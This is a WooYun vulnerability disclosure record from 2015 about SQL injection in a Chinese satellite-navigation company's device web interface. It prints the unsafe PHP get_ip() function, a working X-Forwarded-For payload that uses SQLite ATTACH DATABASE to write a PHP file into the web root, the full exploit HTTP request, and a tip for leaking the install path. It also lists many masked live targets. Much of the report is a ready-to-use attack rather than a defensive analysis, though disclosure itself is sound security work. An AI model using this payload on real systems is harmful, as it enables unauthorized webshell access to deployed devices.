{"id": 84848, "wybug_id": "wooyun-2015-0140314", "wybug_title": "中海达某设备产品多处SQL注入可getshell（附众多案例）", "wybug_corp": "广州中海达卫星导航技术股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-09-13 12:37", "wybug_open_date": "2015-12-14 14:38", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "敏感文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向公众公开  简要描述： 中海达某设备产品多处SQL注入可getshell（附众多案例），SQLite getshell实战。 详细说明：  官方网站产品介绍：http://**.**.**.**/Product.aspx?p1=1相当的高大上，不多说了，该系统采用的是SQLite数据库，可无限制getshell在该系统中 有一个获取ip信息的函数get_ip()\nfunction get_ip(){   \tif ($_SERVER['HTTP_CLIENT_IP'] && $_SERVER['HTTP_CLIENT_IP']!='unknown'){\t\t$ip = $_SERVER['HTTP_CLIENT_IP'];\t}\telseif($_SERVER['HTTP_X_FORWARDED_FOR'] && $_SERVER['HTTP_X_FORWARDED_FOR']!='unknown'){\t\t$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];\t}\telse{\t\t$ip = $_SERVER['REMOTE_ADDR'];\t}\treturn $ip;}\n很明显，只要调用了这个函数，进入sql查询 均可以造成漏洞，通过搜索发现 该系统的多个文件调用了该函数，均可造成SQL注入漏洞，如图\n\n下面随便选取一处进行漏洞证明（这里就选择登录的地方）：在登录的地方，会写入日志文件，我们构造如下payload，可以实现getshell:\nX-Forwarded-For: **.**.**.**',1,2,3,4,5,6);ATTACH DATABASE '/home/www/apache/htdocs/CSS/e.php' AS pwn;CREATE TABLE pwn.exp(dataz text);INSERT INTO pwn.exp(dataz) VALUES('<?php phpinfo();?>');--\n(绝对路径的获取：访问/cover.php 即可爆出系统的绝对路径)好，接下来我们直接发送如下数据包，即可getshell\nPOST /login.php HTTP/1.1Host: **.**.**.**Connection: keep-aliveContent-Length: 70Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8X-Forwarded-For: **.**.**.**',1,2,3,4,5,6);ATTACH DATABASE '/home/www/apache/htdocs/CSS/e.php' AS pwn;CREATE TABLE pwn.exp(dataz text);INSERT INTO pwn.exp(dataz) VALUES('<?php phpinfo();?>');--usr=guest&psw=guest&action=1&lang=en&redirect=%2Fpages%2Fen%2Fuser.php\n\n\n成功获取到shell\nhttp://**.**.**.**/CSS/e.php\n\n\n给出多个案例：\nhttp://**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**:8000/**.**.**.**:8000/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**:8000/**.**.**.**/**.**.**.**/**.**.**.**/http://**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**:8000/\n   漏洞证明：  \n**.**.**.**/CSS/e.php\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-09-15 14:37 厂商回复： CNVD确认并复现所述情况，已由CNVD通过以往建立的处置渠道向软件生产厂商通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}